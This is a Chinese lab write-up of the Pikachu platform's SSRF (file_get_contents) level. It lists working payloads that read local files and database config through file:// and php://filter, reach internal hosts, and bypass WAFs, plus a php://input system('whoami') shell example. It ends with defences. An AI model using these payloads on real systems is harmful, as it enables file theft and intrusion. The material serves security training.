---
layout: post
title: Pikachu - SSRF(file_get_content) Writeup（php://filter 与 data://）
platform: pikachu
date: 2026-10-29 21:05:00 +0800
categories: CTF
---

Pikachu - SSRF(file_get_content) Writeup（php://filter 与 data://）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：SSRF → SSRF(file_get_content)
- 地址：`http://localhost/pikachu/vul/ssrf/ssrf_fgc.php`
- 题型：Web
- 考点：**file_get_contents 的 SSRF**、`php://filter` 读源码、`data://`

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4nts
allow_url_fopen = On          ← ★ file_get_contents 走 http:// 的前提
模块目录：D:\phpstudy_pro\WWW\pikachu\vul\ssrf\
    ssrf_fgc.php      ★ 本关页面
    ssrf_info\
        info1.php     内网服务示例（普希金《假如生活欺骗了你》）
        info2.php     内网服务示例（艾青《我爱这土地》）
```

**页面形态**：

```text
反正都读了,那就在来一首吧
└──────────┬──────────┘
      ★ 这是一个链接，本身就是"预置好参数的示例"
```

**★ 页面源码（第 53 行）**：

```html
<a href="ssrf_fgc.php?file=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info2.php">
    反正都读了,那就在来一首吧
</a>
```

**★ 所以这一关没有输入框 —— 参数 `file` 直接暴露在链接里。**

**作者提示**：

```html
data-content="先了解一下file_get_contents()相关函数的用法吧"
```

**✅ 实测结果（4 种 payload）**

| # | `file` 参数 | 结果 |
|---|---|---|
| 1 | （点链接，默认值）`http://127.0.0.1/.../info2.php` | ✅ 输出"我爱这土地"（艾青）|
| 2 | **`file:///C:/Windows/win.ini`** | **✅ 输出 win.ini 全文** |
| 3 | **`php://filter/convert.base64-encode/resource=ssrf_fgc.php`** | **✅ 输出 base64 → 解码得源码** |
| 4 | **`http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php`** | **✅ 输出"假如生活欺骗了你"（普希金）** |
| 5 | **`data://text/plain,SSRF_DATA_OK`** | **✅ 输出 `SSRF_DATA_OK`** |

二、题目分析

**① 漏洞代码：一行 file_get_contents**

```php
<?php
// ssrf_fgc.php 第 23-29 行
//读取PHP文件的源码:php://filter/read=convert.base64-encode/resource=ssrf.php
//内网请求:http://x.x.x.x/xx.index
if(isset($_GET['file']) && $_GET['file'] !=null){
    $filename = $_GET['file'];              // ★ 用户完全控制
    $str = file_get_contents($filename);    // ★ 直接读取
    echo $str;                              // ★ 结果回显
}
?>
```

**★ 作者的注释已经把"两条利用路线"写出来了**：

```php
//读取PHP文件的源码:php://filter/read=convert.base64-encode/resource=ssrf.php
//内网请求:http://x.x.x.x/xx.index
```

**★ 三个条件（都满足）**：

```
① 参数可控（file）
② 后端"真的去读/请求"（file_get_contents）
③ 结果回显（echo $str）
★ → 有回显的 SSRF + 任意文件读取
```

**② `file_get_contents` 支持哪些协议**

**★ 这是本关的核心知识点。**

**★ 支持的协议（受 php.ini 影响）**：

| 协议 | 需要什么 | 用途 |
|---|---|---|
| `file://` | 无 | **读本地文件** |
| `http://` `https://` | `allow_url_fopen=On` | **SSRF（请求内网）** |
| `ftp://` `ftps://` | `allow_url_fopen=On` | 读 FTP |
| **`php://filter`** | 无 | **读 PHP 源码（base64）** |
| **`php://input`** | POST 数据 | 读请求体 |
| **`data://`** | `allow_url_fopen=On` | **内联数据** |
| `compress.zlib://` | zlib 扩展 | 读压缩流 |
| `phar://` | 无 | 读 phar 包（可触发反序列化）|
| `glob://` | 无 | 列目录（部分版本）|

**★ 实测能用的**：

```
file://      ✅
http://      ✅（allow_url_fopen=On）
php://filter ✅
data://      ✅
```

**★ 和 `curl` 版的差异（重点）**：

| 协议 | curl 版 | **file_get_contents 版** |
|---|---|---|
| `file://` | ✅ | ✅ |
| `http://` | ✅ | ✅ |
| **`dict://`** | ✅ | ❌ **不支持** |
| **`gopher://`** | ✅ | ❌ **不支持** |
| **`php://filter`** | ⚠️ 支持但方式不同 | ✅ **更常用** |
| **`data://`** | ❌ | ✅ |

**★ 一句话**：

```
file_get_contents 不能打 Redis（没 gopher）
但"读文件/读源码"更顺手（php://filter + data://）
★ 所以两关的"打法"不一样
```

**③ ⭐ `php://filter`：读 PHP 源码的标准姿势**

**★ 为什么"不能直接读 .php"？**

```
file_get_contents("ssrf_fgc.php")
→ 会返回 PHP 源码吗？
→ 会！file_get_contents 是"读文件"，不是"执行"
★ 等等，那为什么还要 php://filter？
```

**★ 这里有个细节**：

```
问题不在"读"，而在"输出"：
    echo file_get_contents("xxx.php")
    → 源码里的 <?php ... ?> 会直接输出到 HTML
    → 浏览器把它当"HTML 文本"显示（可能被转义/丢失）
    → 有些字符（如 < >）会被浏览器吃掉
★ 用 base64 编码后，输出是"纯 ASCII 字符串"
→ 完整、不丢失、不会被解析
```

**★ 所以 php://filter 的价值是"保证完整性"**：

```
php://filter/convert.base64-encode/resource=ssrf_fgc.php
→ 文件内容 → base64 编码 → 输出
→ 你拿回来解码 → 完整源码
★ 特别是"二进制文件""含特殊字符的文件"，base64 是必须的
```

**★ 实测**：

```
?file=php://filter/convert.base64-encode/resource=ssrf_fgc.php
→ 页面出现 PD9waHAKLy8qKgp... （base64）
→ 解码后：
   <?php
   /**
    * Created by runner.han
    * There is nothing new under the sun
    */
   ...
```

**★ `php://filter` 的语法拆解**：

```
php://filter/convert.base64-encode/resource=ssrf_fgc.php
└────┬────┘└──────────┬─────────┘└────────┬─────────┘
  协议名          过滤器                目标文件
                  （可以多个，用 | 分隔）
```

**★ 常用过滤器**：

| 过滤器 | 作用 |
|---|---|
| `convert.base64-encode` | base64 编码（最常用）|
| `convert.base64-decode` | base64 解码 |
| `string.rot13` | ROT13 混淆 |
| `string.toupper` / `tolower` | 大小写 |
| `convert.iconv.UTF-8.GBK` | 编码转换 |

**★ 多个过滤器可以串联**：

```
php://filter/convert.base64-encode|convert.base64-encode/resource=xxx.php
→ 双层 base64（绕 WAF 用）
```

**④ `data://`：不用外部服务器就能造内容**

**★ 语法**：

```
data://text/plain,内容
data://text/plain;base64,内容(base64)
```

**★ 实测**：

```
?file=data://text/plain,SSRF_DATA_OK
→ 输出 SSRF_DATA_OK
```

**★ 用途**：

```
① 验证"是否真的有回显"（不用起服务器）
② 盲 SSRF 里"测试 payload 是否被执行"
③ 构造"假的响应内容"（配合某些逻辑漏洞）
```

**★ 注意限制**：

```
· 需要 allow_url_fopen=On（本环境满足）
· URL 里不能有"空格、引号"等特殊字符 → 要 URL 编码
★ 所以它适合"短内容"，不适合"传大文件"
```

**⑤ 内网请求：那两首诗的意义**

**★ `info1.php`**：

```php
$html = <<<A
<br>
<pre>
假如生活欺骗了你

作者：普希金
...
A;
echo $html;
```

**★ `info2.php`**：

```php
$html = <<<A
<br>
<pre>
我爱这土地—艾青
...
A;
echo $html;
```

**★ 它们模拟"内网服务"**：

```
· 正常情况下，外网访问不到（只在内网/本机）
· 但 SSRF 让"服务器替你去请求"
→ 把内网内容返回给你
★ 这就是"SSRF 能读内网"的直观演示
```

**★ 实测**：

```
?file=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php
→ 输出"假如生活欺骗了你"
★ 服务器真的替我们请求了 127.0.0.1
```

三、解题步骤

**第 1 步：点链接（看正常功能）**

```text
① 打开 http://localhost/pikachu/vul/ssrf/ssrf_fgc.php
② 页面只有一行字："反正都读了,那就在来一首吧"
③ 点它
④ URL 变成：ssrf_fgc.php?file=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info2.php
⑤ 页面显示：
   我爱这土地—艾青
   假如我是一只鸟，
   我也应该用嘶哑的喉咙歌唱：
   ...
```

**★ 这一步说明**：

```
① 参数名是 file
② 服务器真的去请求了 127.0.0.1
③ 内容回显给你
★ 接下来就是"把 file 换成别的东西"
```

**第 2 步：⭐ 读系统文件**

**★ 地址栏粘**：

```
http://localhost/pikachu/vul/ssrf/ssrf_fgc.php?file=file:///C:/Windows/win.ini
```

**★ 预期**：

```ini
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

**★ 这一步证明**：

```
file:// 协议能用
→ 服务器上的任意文件都能读
```

**第 3 步：⭐ 读 PHP 源码（本关最有价值）**

**★ 地址栏粘**：

```
http://localhost/pikachu/vul/ssrf/ssrf_fgc.php?file=php://filter/convert.base64-encode/resource=ssrf_fgc.php
```

**★ 页面出现一长串 base64。**

**★ 解码（PowerShell）**：

```powershell
$b64 = "把页面上的那串粘进来"
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
```

**★ 或者 Python**：

```python
import base64
print(base64.b64decode("那串").decode())
```

**★ 解码后**：

```php
<?php
/**
 * Created by runner.han
 * There is nothing new under the sun
 */


$SELF_PAGE = substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+1);
...
```

**★ 读别的文件**：

```
?file=php://filter/convert.base64-encode/resource=../inc/config.inc.php
→ 读数据库配置（DBPW: root）
```

**第 4 步：⭐ 请求内网页面**

**★ 地址栏粘**：

```
http://localhost/pikachu/vul/ssrf/ssrf_fgc.php?file=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php
```

**★ 输出普希金的《假如生活欺骗了你》。**

**★ 这一步的意义**：

```
证明 http:// 协议能用 → 能请求内网
★ 如果内网有"未授权的 Redis / 内网后台 / 云元数据接口"
→ 都能通过这个参数访问到
```

**第 5 步：`data://` 验证回显**

```
http://localhost/pikachu/vul/ssrf/ssrf_fgc.php?file=data://text/plain,SSRF_DATA_OK
```

**★ 输出 `SSRF_DATA_OK`。**

**★ 用途**：

```
确认"真的有回显"
★ 如果连 data:// 都没回显 → 说明是"盲 SSRF"
```

**第 6 步：完整 payload 汇总**

```
// ========== 正常（页面链接里的默认值）==========
http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info2.php

// ========== 读本地文件 ==========
file:///C:/Windows/win.ini
file:///C:/Windows/System32/drivers/etc/hosts
file:///etc/passwd                            （Linux）

// ========== 读 PHP 源码（base64）==========
php://filter/convert.base64-encode/resource=ssrf_fgc.php
php://filter/convert.base64-encode/resource=../inc/config.inc.php
php://filter/convert.base64-encode/resource=../inc/mysql.inc.php

// ========== SSRF（请求内网）==========
http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php
http://127.0.0.1:80/
http://192.168.1.1/                          （内网地址）

// ========== 内联数据 ==========
data://text/plain,SSRF_DATA_OK

// ========== 读请求体（需 POST）==========
php://input
```

四、延伸知识

**① file_get_contents 的几个"近亲"**

**★ 能造成 SSRF 的函数不止一个**：

| 函数 | 说明 | 典型场景 |
|---|---|---|
| **`file_get_contents`** | 读文件/URL 内容 | **本关** |
| `fopen` + `fread` | 同上，流式 | 大文件下载 |
| `readfile` | 直接输出到浏览器 | 文件下载 |
| `curl_exec` | curl 请求 | **SSRF(curl) 那关** |
| `fsockopen` | 原始 TCP | 自定义协议 |
| `include` / `require` | 包含文件 | 文件包含（能读也能执行）|
| `get_headers` | 只取响应头 | 探测存活 |
| `simplexml_load_file` | 解析远程 XML | **XXE 的"远程 DTD"** |

**★ 一个"实战"提醒**：

```
渗透测试时，看到"图片URL/头像URL/导入URL/预览URL"
→ 就要想到"这几个函数都可能被调用"
★ 尤其是 `file_get_contents($user_url)`，最典型
```

**② `php://filter` 的"高阶用法"**

**★ 用法 1：多过滤器串联（绕 WAF）**

```
php://filter/convert.base64-encode|convert.base64-encode/resource=config.php
★ 双层编码 → WAF 的"base64 特征"匹配不到
```

**★ 用法 2：转换编码（读乱码文件）**

```
php://filter/convert.iconv.GBK.UTF-8/resource=some_gbk_file.txt
★ 把 GBK 文件转成 UTF-8 再输出
```

**★ 用法 3：绕过"文件内容校验"**

```
php://filter/convert.base64-decode/resource=xxx.php
★ 先解码再交给"后续处理"
★ 在"文件包含 + 二次渲染"场景有用
```

**★ 用法 4：`resource=` 指向"另一个 php://"**

```
php://filter/convert.base64-encode/resource=php://filter/.../resource=xxx
★ "套娃"（某些 WAF 只检查最外层）
```

**③ `data://` 与 `php://input` 的差别**

| | `data://` | `php://input` |
|---|---|---|
| 数据来源 | **URL 里写死** | **POST 请求体** |
| 长度限制 | URL 长度（约 2KB~8KB）| 受 `post_max_size` |
| 需要什么 | `allow_url_fopen=On` | 无（但要有 POST 数据）|
| 典型用途 | 快速验证 | 传"大 payload" |

**★ 本环境实测**：

```
data://  ✅ 能用
php://input  ⚠️ 需要 POST + 需要"用 include 而不是 file_get_contents"才更典型
```

**★ 一个"实战"技巧**：

```
如果目标是"文件包含"（include）：
    ?file=php://input
    POST body: <?php system('whoami'); ?>
→ 直接 getshell（需要 allow_url_include=On）

如果是"file_get_contents"（本关）：
    ?file=php://input
    POST body: 任意内容
→ 只能"读到内容"，不会执行
★ 差别在"执行 vs 读取"
```

**④ 为什么"回显"是 SSRF 的关键**

**★ 有回显 vs 无回显**：

| | 有回显 | 盲 SSRF |
|---|---|---|
| 能看到的 | 内网响应内容 | 什么都没有 |
| 判断方法 | 直接看页面 | 时间差 / 报错 / 带外 |
| 能干什么 | 读文件、读内网页面、拿 banner | 只能"确认存在"+"探测端口" |
| 难度 | 低 | 高 |

**★ 本关是"有回显"**：

```php
echo $str;      // ★ 这一行就是"回显"
```

**★ 如果作者把 `echo` 删掉**：

```
就变成盲 SSRF
→ 只能靠"响应时间"或"带外请求"来判断
★ 所以"有回显"是这类漏洞"好利用"的原因
```

**⑤ 防御（针对 file_get_contents）**

**❌ 本关的反面教材**：

```php
$filename = $_GET['file'];
$str = file_get_contents($filename);
echo $str;
```

**✅ 第 1 层：不要用"用户输入"当路径（根本）**

```php
// ❌ 危险
file_get_contents($_GET['file']);

// ✅ 白名单映射
$map = [
    'info1' => 'ssrf_info/info1.php',
    'info2' => 'ssrf_info/info2.php',
];
$key = $_GET['id'] ?? '';
if (!isset($map[$key])) die('非法');
$str = file_get_contents($map[$key]);
```

**✅ 第 2 层：限制协议（只允许 file）**

```php
$filename = $_GET['file'];

// 只允许"本地相对路径"，禁止任何协议
if (preg_match('#^[a-zA-Z]+://#', $filename) || strpos($filename, '..') !== false) {
    die('非法的路径');
}
$str = file_get_contents($filename);
```

**★ 注意**：

```
还要防 "../"（目录遍历）
★ 更稳的做法：realpath + 白名单目录前缀
```

**✅ 第 3 层：`open_basedir` 限制目录**

```ini
; php.ini
open_basedir = D:/phpstudy_pro/WWW/pikachu/
```

**★ 效果**：

```
读不到 C:\Windows\win.ini（目录外）
★ 但"读网站内的文件"依然可以
```

**✅ 第 4 层：关掉 `allow_url_fopen`（防远程）**

```ini
; php.ini
allow_url_fopen = Off
```

**★ 效果**：

```
http:// / ftp:// / data:// 全部失效
→ 只剩 file://（本地读）
★ 但会影响"正常的远程请求功能"（要评估）
```

**★ 一个"组合"的防御思路**：

```
① 白名单（首选）
② 只允许"本地相对路径"（禁协议 + 禁 ..）
③ open_basedir 兜底
④ allow_url_fopen=Off（如果业务不需要远程）
★ 四层叠加，很难绕
```

**⑥ 本关与 SSRF(curl) 的对照总结**

| | SSRF(curl) | **SSRF(file_get_content)** |
|---|---|---|
| 函数 | `curl_exec` | **`file_get_contents`** |
| 参数 | `url` | **`file`** |
| 读文件 | ✅ `file://` | ✅ `file://` |
| 请求内网 | ✅ `http://` | ✅ `http://` |
| **端口探测** | ✅ `dict://` | ❌ 不支持 |
| **打 Redis** | ✅ `gopher://` | ❌ 不支持 |
| **读 PHP 源码** | ⚠️ 可以但麻烦 | ✅ **`php://filter` 很顺** |
| 内联数据 | ❌ | ✅ `data://` |

**★ 一句话**：

```
curl 版"打"的能力强（gopher/dict）
file_get_contents 版"读"的能力强（php://filter）
★ 所以两个都要会
```

五、总结

- **本题核心：`file_get_contents($_GET['file'])` 直接读用户给的路径 → 能读本地文件、读 PHP 源码、请求内网（SSRF）。**

- **一行漏洞代码 + 一句 echo**：

```php
$filename = $_GET['file'];
$str = file_get_contents($filename);       // ★ 协议 + 路径完全可控
echo $str;                                 // ★ 结果回显
```

- **⭐ 八个必记要点**：

```text
① file_get_contents 的支持协议
   file://  读本地文件
   http://  请求内网（需 allow_url_fopen=On）
   php://filter  读源码（base64）
   data://  内联数据
   ★ 不支持 dict:// 和 gopher://

② php://filter 的价值是"保证输出完整"
   base64 编码后不会被 HTML 解析、不会丢字符
   ★ 读二进制/含特殊字符的文件必须用它

③ php://filter 的语法
   php://filter/convert.base64-encode/resource=目标文件
   ★ 过滤器可以串联（用 |）

④ data:// 用来"快速验证回显"
   data://text/plain,SSRF_DATA_OK
   ★ 不用起服务器就能测

⑤ 本关没有输入框
   参数 file 直接暴露在页面链接里
   ★ 玩法：点链接 → 改 URL 里的 file=

⑥ 内网服务（info1/info2）的意义
   模拟"外网访问不到、但服务器能访问"的服务
   ★ SSRF 的本质就是"借用服务器的网络位置"

⑦ 有回显是"好利用"的关键
   本关 echo $str → 能直接看到内网响应
   ★ 如果 echo 被去掉 → 变成盲 SSRF，难度大增

⑧ 防御：白名单 > 禁协议+禁".."> open_basedir > allow_url_fopen=Off
   ★ 只"过滤 http://"是不够的（file:// 还能读文件）
```

- **实测数据**：

```text
默认链接（info2.php）                → 我爱这土地—艾青
file:///C:/Windows/win.ini           → [fonts] [extensions] [mci extensions] [files] [Mail] MAPI=1
php://filter/convert.base64-encode/resource=ssrf_fgc.php
                                     → base64（解码得源码）
http://127.0.0.1/.../info1.php       → 假如生活欺骗了你（普希金）
data://text/plain,SSRF_DATA_OK       → SSRF_DATA_OK
```

- **进度**：

```text
platform: pikachu   43 篇（本地 109 篇）

├── 暴力破解            4/4    ✅
├── CSRF                3/3    ✅
├── XSS                10/10   ✅
├── SQL 注入           10/10   ✅
├── RCE                 2/2    ✅
├── File Inclusion      2/2    ✅
├── Unsafe Filedownload 1/1    ✅
├── Unsafe Fileupload   3/7    （暂停，剩 4 关）
├── Over Permission     2/2    ✅
├── 目录遍历            1/1    ✅
├── 敏感信息泄露        1/1    ✅
├── PHP 反序列化        1/1    ✅
├── XXE                 1/1    ✅
├── URL 重定向          1/1    ✅
└── SSRF                2/2    ✅  ← curl + file_get_contents
```

**手工复现要点**：

```text
· 打开 ssrf_fgc.php → 点"反正都读了,那就在来一首吧" → 看到艾青的诗
· 改 file=file:///C:/Windows/win.ini → 看到 win.ini
· 改 file=php://filter/convert.base64-encode/resource=ssrf_fgc.php → 拿 base64 → 解码
· 改 file=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php → 看到普希金的诗
· 改 file=data://text/plain,SSRF_DATA_OK → 看到 SSRF_DATA_OK
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  file_get_contents 版 SSRF = "读文件 + 读源码 + 请求内网"       │
│                                                            │
│  ?file=file:///C:/Windows/win.ini          → 读文件          │
│  ?file=php://filter/...resource=xxx.php    → 读源码（base64） │
│  ?file=http://127.0.0.1/内网页面            → SSRF           │
│  ?file=data://text/plain,内容               → 验证回显         │
│                                                            │
│  ★ 不支持 dict:// 和 gopher://（那是 curl 版的强项）            │
│  ★ php://filter 的价值：base64 保证输出完整、不被解析            │
│  ★ 本关没有输入框，参数在链接里 → 点进去改 URL                   │
│                                                            │
│  防御：白名单（首选）> 禁协议+禁 ".." > open_basedir            │
└────────────────────────────────────────────────────────────┘
```
